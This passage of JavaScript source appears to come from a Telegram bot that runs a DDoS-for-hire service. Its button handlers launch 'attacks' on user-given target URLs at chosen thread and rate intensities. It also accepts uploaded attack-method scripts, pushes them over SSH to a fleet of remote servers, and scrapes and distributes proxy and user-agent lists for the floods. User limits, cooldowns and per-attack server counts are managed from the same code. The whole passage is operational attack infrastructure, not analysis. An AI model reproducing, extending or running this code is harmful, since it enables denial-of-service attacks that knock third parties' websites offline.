    if (data === 'adm_botcontrol') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🤖'); return showBotControl(chatId, msgId); }
    if (data === 'botctl_on') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); store.botstate.mutate(s => { s.online = true; s.lastToggleBy = userId; s.lastToggleAt = new Date().toISOString(); }); await answerCB(q.id, '🟢', true); return showBotControl(chatId, msgId); }
    if (data === 'botctl_off') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); store.botstate.mutate(s => { s.online = false; s.lastToggleBy = userId; s.lastToggleAt = new Date().toISOString(); }); await answerCB(q.id, '🔴', true); return showBotControl(chatId, msgId); }
    if (data === 'botctl_msg') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'botctl_msg', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '✏️');
      return bot.sendMessage(chatId, `✏️ Send new maintenance message:`, { reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_scandeps') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🔬'); return showScanDeps(chatId, msgId); }
    if (data === 'adm_eligible') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🔥'); return showEligible(chatId, msgId); }

    if (data === 'int_cancel') { pendingInput.delete(userId); await answerCB(q.id, '❌', true); return edit(chatId, msgId, '❌ <b>Attack cancelled.</b>', { reply_markup: backMenu() }); }
    if (data.startsWith('int_')) {
      const level = data.slice(4);
      const preset = INTENSITY[level];
      if (!preset) return answerCB(q.id, '❌ Unknown', true);
      if (preset.adminOnly && !isAdmin(userId)) return answerCB(q.id, '🔒 Admin only', true);

      const pending = pendingInput.get(userId);
      if (!pending || pending.action !== 'awaiting_intensity') return answerCB(q.id, '❌ Session expired', true);
      const { methodId, target, duration } = pending.data;

      const user = getUser(userId) || { telegramId: userId };
      const method = getMethod(methodId);
      if (!method) return answerCB(q.id, '❌', true);
      if (!isMethodEnabled(method.id)) return answerCB(q.id, '🔴', true);
      if (!userCanUseMethod(user, method.id)) return answerCB(q.id, '🔒', true);
      if (user.role === 'pending') return answerCB(q.id, '⏳', true);
      if (user.role === 'banned') return answerCB(q.id, '🚫', true);

      const cdLeft = getCooldownLeft(userId);
      if (cdLeft > 0) return answerCB(q.id, `⏳ ${cdLeft}s`, true);

      const conc = user.limits?.maxConcurrent || 0;
      if (conc > 0 && userActiveBatches(userId) >= conc) return answerCB(q.id, `❌ Max ${conc} concurrent attacks`, true);

      if (preset.minCores) {
        const eligible = getEligibleServers(level);
        if (eligible.length === 0) return answerCB(q.id, `❌ No servers with ${preset.minCores}+ cores`, true);
      }

      const neededAux = scanMethodAux(method.file);
      const missingAux = neededAux.filter(a => !fs.existsSync(path.join(CONFIG.SCRIPT_DIR, a)));
      if (missingAux.length) return answerCB(q.id, `❌ Missing locally: ${missingAux.join(', ')}`, true);

      let parsed;
      try {
        let t, r;
        if (method.parseIntensity) { const int = method.parseIntensity(level, 4); t = String(int.conn); r = String(int.streams); }
        else if (level === 'auto') { t = '8'; r = '60'; }
        else { t = String(preset.threads); r = String(preset.rate); }
        parsed = method.parse([target, String(duration), t, r]);
        const v = validateTarget(parsed.target);
        if (isBlacklisted(v.host)) throw new Error('host blacklisted');
        checkUserLimits(user, parsed.duration, parsed.threads, parsed.rate, parsed);
      } catch (e) { return answerCB(q.id, '❌ ' + e.message, true); }

      pendingInput.delete(userId);
      await answerCB(q.id, `${preset.emoji} ${preset.label}`, true);
      await edit(chatId, msgId, `💥 <b>Launching...</b>\n\n${method.emoji} ${esc(method.name)}\n${preset.emoji} ${preset.label}\n🎯 <code>${esc(target)}</code>\n⏱ ${duration}s`, { reply_markup: { inline_keyboard: [] } });
      return runAttack(user, method, parsed, chatId, { intensity: level });
    }

    if (data.startsWith('batch_stop_')) {
      const batchId = data.slice(11);
      const list = Object.values(store.sessions.get()).filter(s => s.batchId === batchId && s.status === 'running');
      if (!list.length) return answerCB(q.id, '❌', true);
      if (list[0].owner !== userId && !isAdmin(userId)) return answerCB(q.id, '❌', true);
      const n = stopBatch(batchId, isAdmin(userId) ? null : userId);
      await answerCB(q.id, `🛑 ${n}`, true);
      return showSessions(chatId, msgId, userId);
    }

    if (data.startsWith('sess_stop_')) {
      const id = data.slice(10);
      const s = store.sessions.get()[id];
      if (!s) return answerCB(q.id, '❌', true);
      if (s.owner !== userId && !isAdmin(userId)) return answerCB(q.id, '❌', true);
      stopSession(id, 'manual');
      await answerCB(q.id, `🛑`, true);
      return showSessions(chatId, msgId, userId);
    }

    if (data.startsWith('method_') && !/^method(view|_test_|_resync_|_delete_)/.test(data)) {
      const id = data.slice('method_'.length);
      await answerCB(q.id, '📦');
      return showMethodDetail(chatId, msgId, id, userId);
    }

    if (data.startsWith('quick_')) {
      const methodId = data.slice('quick_'.length);
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌', true);
      const user = getUser(userId) || { telegramId: userId };
      if (!isMethodEnabled(m.id)) return answerCB(q.id, '🔴', true);
      if (!userCanUseMethod(user, m.id)) return answerCB(q.id, '🔒', true);
      await answerCB(q.id, '💥');
      return startQuickLaunch(chatId, user, m.id);
    }

    if (data.startsWith('adm_users_p')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminUsers(chatId, msgId, parseInt(data.slice(11), 10) || 1); }
    if (data === 'adm_users') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminUsers(chatId, msgId, 1); }
    if (data === 'adm_manage') { if (!isOwner(userId)) return answerCB(q.id, '🚫', true); return showManageAdmins(chatId, msgId); }

    if (data.startsWith('usr_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showUserActions(chatId, msgId, data.slice(4), userId); }
    if (data.startsWith('makeadm_')) {
      if (!isOwner(userId)) return answerCB(q.id, '❌', true);
      const t = data.slice(8);
      if (isOwner(Number(t))) return answerCB(q.id, '❌', true);
      const u = getUser(t);
      if (!u || u.role === 'admin') return answerCB(q.id, '❌', true);
      upsertUser(t, { role: 'admin', limits: { ...ADMIN_LIMITS }, promotedBy: userId, promotedAt: new Date().toISOString() });
      await answerCB(q.id, '👑', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('revokadm_')) {
      if (!isOwner(userId)) return answerCB(q.id, '❌', true);
      const t = data.slice(9);
      if (isOwner(Number(t))) return answerCB(q.id, '❌', true);
      const u = getUser(t);
      if (!u || u.role !== 'admin') return answerCB(q.id, '❌', true);
      upsertUser(t, { role: 'user', limits: { ...DEFAULT_LIMITS }, demotedBy: userId, demotedAt: new Date().toISOString() });
      await answerCB(q.id, '✅', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('uaccessall_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); upsertUser(data.slice(11), { allowedMethods: null }); await answerCB(q.id, '🟢', true); return showUserAccess(chatId, msgId, data.slice(11)); }
    if (data.startsWith('uaccessnone_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); upsertUser(data.slice(12), { allowedMethods: [] }); await answerCB(q.id, '🔒', true); return showUserAccess(chatId, msgId, data.slice(12)); }
    if (data.startsWith('uaccess_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showUserAccess(chatId, msgId, data.slice(8)); }
    if (data.startsWith('uat_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const rest = data.slice(4);
      const sep = rest.indexOf('_');
      if (sep < 0) return answerCB(q.id, '❌', true);
      const targetId = rest.slice(0, sep);
      const mid = rest.slice(sep + 1);
      const u = getUser(targetId);
      if (!u) return answerCB(q.id, '❌', true);
      const wasAllowed = (u.allowedMethods == null) || (Array.isArray(u.allowedMethods) && u.allowedMethods.includes(mid));
      if (wasAllowed) {
        let am = u.allowedMethods;
        if (am == null) am = allMethods().map(m => m.id);
        am = am.filter(x => x !== mid);
        upsertUser(targetId, { allowedMethods: am });
      } else {
        const cur = Array.isArray(u.allowedMethods) ? [...u.allowedMethods] : [];
        if (!cur.includes(mid)) cur.push(mid);
        upsertUser(targetId, { allowedMethods: cur });
      }
      await answerCB(q.id, wasAllowed ? '🔒' : '✅');
      return showUserAccess(chatId, msgId, targetId);
    }
    if (data.startsWith('approve_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); const t = data.slice(8); if (isOwner(Number(t))) return answerCB(q.id, '❌', true); upsertUser(t, { role: 'user' }); await answerCB(q.id, '✅', true); return showUserActions(chatId, msgId, t, userId); }
    if (data.startsWith('ban_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(4);
      if (isOwner(Number(t))) return answerCB(q.id, '❌', true);
      const u = getUser(t);
      if (u?.role === 'admin') return answerCB(q.id, '❌ demote first', true);
      upsertUser(t, { role: 'banned' });
      await answerCB(q.id, '🚫', true);
      return showUserActions(chatId, msgId, t, userId);
    }
    if (data.startsWith('del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(4);
      if (isOwner(Number(t))) return answerCB(q.id, '❌', true);
      const u = getUser(t);
      if (u?.role === 'admin') return answerCB(q.id, '❌ demote first', true);
      store.users.mutate(u => { delete u[t]; });
      await answerCB(q.id, '❌', true);
      return showAdminUsers(chatId, msgId, 1);
    }
    if (data.startsWith('setdur_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(7);
      pendingInput.set(userId, { action: 'set_dur', data: { targetId: t }, expires: Date.now() + 60000 });
      await answerCB(q.id, '⏱');
      return bot.sendMessage(chatId, `Max duration (0=∞):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('setconc_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(8);
      pendingInput.set(userId, { action: 'set_conc', data: { targetId: t }, expires: Date.now() + 60000 });
      await answerCB(q.id, '⚔️');
      return bot.sendMessage(chatId, `Max concurrent attacks (0=∞):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('setmaxsrv_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const t = data.slice(10);
      pendingInput.set(userId, { action: 'set_maxsrv', data: { targetId: t }, expires: Date.now() + 60000 });
      await answerCB(q.id, '🖥');
      return bot.sendMessage(chatId, `Max servers per attack (0=∞):`, { reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_methods') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminMethods(chatId, msgId); }
    if (data === 'methods_enable_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      store.methodstate.mutate(s => { for (const m of allMethods()) { if (!s[m.id]) s[m.id] = { enabled: true, stats: { launches: 0, lastAt: 0, lastBy: null } }; s[m.id].enabled = true; } });
      await answerCB(q.id, '🟢', true);
      return showAdminMethods(chatId, msgId);
    }
    if (data === 'methods_disable_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      store.methodstate.mutate(s => { for (const m of allMethods()) { if (!s[m.id]) s[m.id] = { enabled: false, stats: { launches: 0, lastAt: 0, lastBy: null } }; s[m.id].enabled = false; } });
      await answerCB(q.id, '🔴', true);
      return showAdminMethods(chatId, msgId);
    }
    if (data.startsWith('methodview_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminMethodDetail(chatId, msgId, data.slice(11)); }
    if (data.startsWith('mtoggle_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(8);
      const st = getMethodState(id);
      updateMethodState(id, { enabled: !st.enabled });
      await answerCB(q.id, !st.enabled ? '🟢' : '🔴', true);
      return showAdminMethodDetail(chatId, msgId, id);
    }
    if (data.startsWith('mcooldown_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(11);
      pendingInput.set(userId, { action: 'set_mcooldown', data: { methodId: id }, expires: Date.now() + 60000 });
      await answerCB(q.id, '⏳');
      return bot.sendMessage(chatId, `Method cooldown in seconds (0=disabled):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('method_test_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(12);
      const m = getMethod(id);
      if (!m) return answerCB(q.id, '❌', true);
      if (m.builtin) return answerCB(q.id, 'built-in', true);
      try {
        const testArgs = buildArgsFromTemplate(m.template, 'https://test.local', '60', '16', '90');
        const cmd = `node ${m.file} ${testArgs.map(a => /\s/.test(a) ? `"${a}"` : a).join(' ')}`;
        await answerCB(q.id, '🧪', true);
        return edit(chatId, msgId, `🧪 <b>Test — ${esc(m.name)}</b>\n\n<code>${esc(m.template)}</code>\n\nWill run:\n<code>${esc(cmd)}</code>`, { reply_markup: { inline_keyboard: [[btn('⬅️ Back', `methodview_${id}`, 'primary')]] } });
      } catch (e) { return answerCB(q.id, '❌', true); }
    }
    if (data.startsWith('method_resync_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(14);
      const m = getMethod(id);
      if (!m) return answerCB(q.id, '❌', true);
      await answerCB(q.id, '🔄', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try { remoteHashCache.delete(`${s.id}:${m.file}`); remoteDepsCache.delete(s.id); await syncMethodToServer(s.id, m.file); ok++; } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminMethodDetail(chatId, msgId, id);
    }
    if (data.startsWith('method_delete_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); const id = data.slice(14); store.methods.mutate(list => { const i = list.findIndex(x => x.id === id); if (i >= 0) list.splice(i, 1); }); store.methodstate.mutate(s => { delete s[id]; }); await answerCB(q.id, '🗑', true); return showAdminMethods(chatId, msgId); }
    if (data === 'addmethod_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'am_file', data: {}, expires: Date.now() + 300000 });
      await answerCB(q.id, '🔧');
      return bot.sendMessage(chatId, `🔧 Send <code>.js</code> file as document.`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'addmethod_save') {
      const pending = pendingInput.get(userId);
      if (!pending || pending.action !== 'am_confirm') return answerCB(q.id, '❌', true);
      const d = pending.data;
      const validation = await validateMethodFile(d.fileName);
      if (!validation.ok) return answerCB(q.id, '❌ ' + validation.error, true);
      store.methods.mutate(list => {
        list.push({ id: d.methodId, name: d.methodId, file: d.fileName, template: d.template, sample: d.sampleCmd, example: `/attack ${d.methodId} <url> <dur>`, addedBy: userId, addedAt: new Date().toISOString() });
      });
      updateMethodState(d.methodId, { enabled: true });
      pendingInput.delete(userId);
      await answerCB(q.id, '✅', true);
      const detectedDeps = scanMethodDeps(d.fileName);
      const detectedAux = scanMethodAux(d.fileName);
      const sm = await bot.sendMessage(chatId, `⚙️ Syncing…`, { parse_mode: 'HTML' });
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try { remoteHashCache.delete(`${s.id}:${d.fileName}`); remoteDepsCache.delete(s.id); await syncMethodToServer(s.id, d.fileName); ok++; } catch {}
      }));
      return edit(chatId, sm.message_id,
        `✅ <b>Method added!</b>\n\nID: <code>${d.methodId}</code>\nFile: <code>${d.fileName}</code>\nDeps: ${detectedDeps.length ? detectedDeps.map(x => `<code>${esc(depDisplay(x))}</code>`).join(', ') : '<i>none</i>'}\nAux: ${detectedAux.length ? detectedAux.map(x => `<code>${esc(x)}</code>`).join(', ') : '<i>none</i>'}\n\n🎯 <code>/attack ${d.methodId} https://example.com 60</code>\n📤 ${ok}/${servers.length}`,
        { reply_markup: { inline_keyboard: [[btn('⬅️ Back', 'adm_methods', 'primary')]] } });
    }
    if (data === 'addmethod_cancel') { pendingInput.delete(userId); await answerCB(q.id, '❌', true); return showAdminMethods(chatId, msgId); }

    if (data === 'adm_presets') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminPresets(chatId, msgId); }
    if (data.startsWith('preset_del_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); store.presets.mutate(p => { delete p[data.slice(11)]; }); await answerCB(q.id, '🗑', true); return showAdminPresets(chatId, msgId); }
    if (data.startsWith('preset_') && !data.startsWith('preset_del_') && !data.startsWith('preset_add')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showPresetDetail(chatId, msgId, data.slice(7)); }
    if (data === 'preset_add') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'preset_name', data: {}, expires: Date.now() + 180000 });
      await answerCB(q.id, '🎯');
      return bot.sendMessage(chatId, `Preset name (2-20 chars):`, { reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_servers') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminServers(chatId, msgId); }
    if (data === 'syncall_methods') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🔄', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      if (!servers.length) return answerCB(q.id, '📭', true);
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try { for (const m of allMethods()) remoteHashCache.delete(`${s.id}:${m.file}`); remoteDepsCache.delete(s.id); await syncMethodToServer(s.id, null); ok++; } catch {}
      }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data === 'provision_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '⚡', true);
      const servers = store.servers.get();
      let ok = 0;
      await Promise.allSettled(servers.map(async s => { try { const conn = await getServerConn(s.id); await provisionRemote(s.id, conn); ok++; } catch {} }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data === 'deps_all') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '📦', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => {
        try {
          const conn = await getServerConn(s.id);
          const env = remoteEnvCache.get(s.id) || await collectRemoteEnv(s.id, conn);
          if (!env?.nodePath) return;
          remoteDepsCache.delete(s.id);
          await ensureDepsOnRemote(conn, s.id, env);
          ok++;
        } catch {}
      }));
      await answerCB(q.id, `✅ ${ok}/${servers.length}`, true);
      return showAdminServers(chatId, msgId);
    }
    if (data === 'del_offline') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const offline = store.servers.get().filter(s => s.status === 'offline');
      if (!offline.length) return answerCB(q.id, '📭 no offline', true);
      for (const s of offline) removeServer(s.id);
      await answerCB(q.id, `🗑 ${offline.length}`, true);
      return showAdminServers(chatId, msgId);
    }

    if (data.startsWith('srv_') && !/^srv_(sync_|del_|health_|group_|diag_|provision_|deps_|test_|edit_port_)/.test(data)) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      return showServerActions(chatId, msgId, data.slice(4));
    }
    if (data.startsWith('srv_del_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); removeServer(data.slice(8)); await answerCB(q.id, '❌', true); return showAdminServers(chatId, msgId); }
    if (data.startsWith('srv_test_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(9);
      const s = getServer(id);
      if (!s) return answerCB(q.id, '❌', true);
      await answerCB(q.id, '🧪 Testing…', true);
      serverConns.delete(id);
      healthCache.delete(id);
      remoteEnvCache.delete(id);
      const r = await sshTest(s.host, s.port || 22, s.username, s.password, 15000);
      const msg = r.tcp === 'open' && r.auth === 'ok'
        ? `🟢 ${s.host}:${s.port || 22} — ok${r.authInfo ? ` · ${r.authInfo}` : ''} · ${r.elapsed}ms`
        : `🔴 ${r.tcp === 'open' ? `auth fail: ${r.error}` : `tcp ${r.tcp}`}`;
      await answerCB(q.id, msg, true);
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_edit_port_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(14);
      pendingInput.set(userId, { action: 'srv_set_port', data: { serverId: id }, expires: Date.now() + 60000 });
      await answerCB(q.id, '🔌');
      return bot.sendMessage(chatId, `🔌 New SSH port (1-65535):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('srv_sync_')) { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); const id = data.slice(9); await answerCB(q.id, '🔄', true); try { for (const m of allMethods()) remoteHashCache.delete(`${id}:${m.file}`); remoteDepsCache.delete(id); await syncMethodToServer(id, null); } catch {} return showServerActions(chatId, msgId, id); }
    if (data.startsWith('srv_provision_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(14);
      await answerCB(q.id, '⚡', true);
      try {
        const conn = await getServerConn(id);
        await provisionRemote(id, conn, (m) => bot.sendMessage(chatId, `⚡ ${esc(getServer(id)?.name || id)}: ${esc(m)}`).catch(() => {}));
        await answerCB(q.id, '✅', true);
      } catch (e) { await answerCB(q.id, '❌ ' + e.message.slice(0, 100), true); }
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_deps_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(9);
      await answerCB(q.id, '📦', true);
      try {
        const conn = await getServerConn(id);
        const env = remoteEnvCache.get(id) || await collectRemoteEnv(id, conn);
        if (!env?.nodePath) throw new Error('no node');
        remoteDepsCache.delete(id);
        const r = await ensureDepsOnRemote(conn, id, env, (m) => bot.sendMessage(chatId, `📦 ${esc(getServer(id)?.name || id)}: ${esc(m)}`).catch(() => {}));
        await answerCB(q.id, r.installed ? `✅ ${r.installedList?.join(', ') || 'installed'}` : '✅ already present', true);
      } catch (e) { await answerCB(q.id, '❌ ' + e.message.slice(0, 100), true); }
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_health_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(11);
      await answerCB(q.id, '🔍', true);
      healthCache.delete(id); remoteEnvCache.delete(id);
      const r = await checkServerHealth(id, true);
      const env = r.env;
      const msg = r.online ? `🟢 ${env ? hardwareBadge(env) : ''}${env?.version ? ` · node ${env.version}` : ''}` : `🔴 ${r.error || 'offline'}`;
      await answerCB(q.id, msg, true);
      return showServerActions(chatId, msgId, id);
    }
    if (data.startsWith('srv_diag_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(9);
      await answerCB(q.id, '🧪', true);
      try {
        const conn = await getServerConn(id);
        let auxCheck = 'echo "=== AUX FILES ==="; ';
        for (const a of AUX_FILES) auxCheck += `if [ -f ${shellQuote(CONFIG.REMOTE_DIR + '/' + a)} ]; then echo "${a}: $(wc -l < ${shellQuote(CONFIG.REMOTE_DIR + '/' + a)}) lines"; else echo "${a}: MISSING"; fi; `;
        const r = await sshExec(conn,
          `echo "=== UPTIME ==="; uptime; ` +
          `echo "=== CORES ==="; nproc; ` +
          `echo "=== MEMORY ==="; free -m | head -2; ` +
          `echo "=== DISK ==="; df -h / | tail -1; ` +
          `echo "=== NODE ==="; bash -lc 'command -v node; node -v' 2>&1; ` +
          auxCheck +
          `echo "=== REMOTE_DIR ==="; ls -la ${CONFIG.REMOTE_DIR} 2>&1 | head -20; ` +
          `echo "=== DEPS ==="; ls ${CONFIG.REMOTE_DIR}/node_modules 2>/dev/null | head -30 || echo "none"; ` +
          `echo "=== RUNNING ==="; pgrep -af 'node .*\\.js' 2>&1 | head -10`,
          20000);
        return edit(chatId, msgId, `🧪 <b>Diag — ${esc(getServer(id)?.name || id)}</b>\n\n<pre>${esc((r.out || '').slice(0, 4000))}</pre>`, { reply_markup: { inline_keyboard: [[btn('⬅️ Back', `srv_${id}`, 'primary')]] } });
      } catch (e) { return answerCB(q.id, '❌ ' + e.message, true); }
    }
    if (data.startsWith('srv_group_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const id = data.slice(10);
      pendingInput.set(userId, { action: 'set_group', data: { serverId: id }, expires: Date.now() + 60000 });
      await answerCB(q.id, '🏷');
      return bot.sendMessage(chatId, `Tag name (or "-" to clear):`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'addsrv_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'as_addr', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '🔌');
      return bot.sendMessage(chatId, `🔌 <b>Add Server</b>\n\nSend <code>IP:PORT</code>\n<i>Name will be auto-assigned</i>\n<i>If port isn't 22, use the actual SSH port</i>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_proxies') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); return showAdminProxies(chatId, msgId); }
    if (data === 'proxy_upload') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'proxy_file', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '📁');
      return bot.sendMessage(chatId, `📁 Send .txt`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'proxy_scrape') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🔄', true); const n = await scrapeProxies(); await answerCB(q.id, `+${n} · ${readProxies().length}`, true); return showAdminProxies(chatId, msgId); }
    if (data === 'proxy_health') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '🧪', true); const r = await scoreProxies(50); await answerCB(q.id, `🟢 ${r.alive} · 🔴 ${r.dead}`, true); return showAdminProxies(chatId, msgId); }
    if (data === 'proxy_syncall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '📤', true);
      const servers = store.servers.get().filter(s => s.status === 'online');
      let ok = 0;
      await Promise.allSettled(servers.map(async s => { try { const conn = await getServerConn(s.id); await ensureAuxOnRemote(conn, s.id, CONFIG.PROXY_FILE); ok++; } catch {} }));
      await answerCB(q.id, `${ok}/${servers.length}`, true);
      return showAdminProxies(chatId, msgId);
    }
    if (data === 'proxy_clear') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); saveProxies([]); await answerCB(q.id, '🗑', true); return showAdminProxies(chatId, msgId); }

    if (data === 'adm_blacklist') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const list = store.blacklist.get();
      const txt = list.length ? '🚫 <b>Blacklist:</b>\n' + list.map(h => `• <code>${esc(h)}</code>`).join('\n') : '📭 Empty';
      await answerCB(q.id, '🚫');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_stats') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      const users = Object.values(store.users.get());
      const s = serverStats();
      const hist = store.history.get();
      const methods = allMethods();
      const running = Object.values(store.sessions.get()).filter(x => x.status === 'running');
      const batches = new Set(running.map(x => x.batchId)).size;
      const q = attackQueue.stats();
      const txt = [
        '📊 <b>Global Stats</b>', '',
        `🏛 Bot: ${botIsOnline() ? '🟢 ONLINE' : '🔴 MAINTENANCE'}`,
        `👥 Users: ${users.length}`,
        `📡 Servers: ${s.online}/${s.total}`,
        `⚔️ Batches: ${batches} · Sessions: ${running.length}`,
        `🎯 Queue: ${q.pending} pending · ${q.running} running`,
        `💥 Methods: ${methods.filter(m => m.enabled).length}/${methods.length}`,
        `🌐 Proxies: ${formatNum(readProxies().length)} · 🎭 UAs: ${formatNum(readUAs().length)}`,
        `📜 Total attacks: ${hist.length}`,
        `🖥 Mode: <b>REMOTE-ONLY</b>`,
      ].join('\n');
      await answerCB(q.id, '📊');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_audit') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); await answerCB(q.id, '📜'); return showAudit(chatId, msgId); }
    if (data === 'adm_broadcast') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      pendingInput.set(userId, { action: 'broadcast_msg', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, '📢');
      return bot.sendMessage(chatId, `📢 Send message:`, { reply_markup: { force_reply: true, selective: true } });
    }
    if (data === 'adm_refresh') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫', true);
      await answerCB(q.id, '🔄');
      const servers = store.servers.get();
      if (!servers.length) return edit(chatId, msgId, '📭 No servers', { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
      let online = 0, done = 0;
      await Promise.all(servers.map(async s => {
        healthCache.delete(s.id); remoteEnvCache.delete(s.id); remoteDepsCache.delete(s.id);
        const r = await checkServerHealth(s.id, true);
        if (r.online) online++;
        done++;
        edit(chatId, msgId, `🔄 ${done}/${servers.length} · 🟢 ${online}`).catch(() => {});
      }));
      return edit(chatId, msgId, `✅ Done\n🟢 ${online} · 🔴 ${servers.length - online}`, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_killall') { if (!isAdmin(userId)) return answerCB(q.id, '🚫', true); const n = stopAllSessions(null); await answerCB(q.id, n ? `💀 ${n}` : '📭', true); return showAdminPanel(chatId, msgId, userId); }

    await answerCB(q.id, '⚠️');
  } catch (e) {
    console.error('[callback]', e);
    try { await answerCB(q.id, '❌ ' + e.message, true); } catch {}
  }
});

/* ══════════════════════════════════════════════════════════════════════════
   PENDING INPUT ROUTER
   ══════════════════════════════════════════════════════════════════════════ */

bot.on('message', async msg => {
